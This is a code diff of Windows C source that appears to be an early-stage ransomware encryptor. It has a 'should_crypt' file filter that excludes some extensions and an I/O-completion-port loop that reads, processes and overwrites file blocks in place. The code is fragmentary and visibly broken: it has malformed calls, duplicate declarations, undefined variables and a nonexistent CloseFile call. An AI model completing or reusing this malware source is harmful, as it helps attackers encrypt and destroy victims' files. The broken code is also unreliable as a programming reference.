@@ -3,14 +3,7 @@
 
 char *exclude[]={".pdf",".txt"};
 HANDLE CompletionPort;
-int filesize(char *file)
-{
-FILE *filep = fopen(file);
-fseek(0,filep,SEEK_END);
-return 
 
-
-}
 int should_crypt(char *file)
 {
 for(i=0;i!=sizeof(exclude)/sizeof(char*);i++)
@@ -22,7 +15,6 @@ return 0;
 }
 return 1;
 }
-bool close_io
 bool block_read(overlapped_enc *ovl)
 {
 LARGE_INTEGER li;
@@ -56,12 +48,22 @@ ovl->operation = READ;
 
 
 }
-bool handle_eof(overlapped_end *ovl)
+bool handle_eof(overlapped_enc *ovl)
 {
-      memset(ovl->tempbuff,0,sizeof(ovl->tempbuff));
-BOOL res = ReadFile(ovl-> file,tempguff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
+      memset(ovl->tempbuff,0,BLOCK_SIZE);
+BOOL res = ReadFile(ovl-> file,tempbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
+
+BOOL res = WriteFile(ovl->file,tempbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
 ovl->operation = CLOSE_IO;
   PostQueuedCompletionStatus(CompletionPort,0,0,(LPOVERLAPPED)ovl);
+}
+void close_io(overlapped_enc *ovl)
+{
+CancelIo(ovl->file);
+CloseFile(ovl->file);
+      free(ovl);
+
+
 }
 void crypt(char *key)
 {
@@ -71,28 +73,23 @@ overlapped_enc *OverLapped;
 LONGLONG offset;
 while(1)
   {
-result = GetQueuedCompletionStatus(CompletionPort,&NumberOfBytes,CompletionKey,&OverLapped,INFINITE);
+result = GetQueuedCompletionStatus(CompletionPort,&NumberOfBytes,CompletionKey,(LPOVERLAPPED*)&OverLapped,5000);
 switch(OverLapped->operation)
   {
     case WRITE:
- 
-      
+ block_write(OverLapped);   
     break;
-
+        
     case READ:
-
-
+block_read(OverLapped);
     break;
-
+        
     case HANDLE_EOF:
-
-
-
+handle_eof(OverLapped);
     break;
 
     case CLOSE_IO:
-
-
+close_io(OverLapped);
     break;
   }
   }
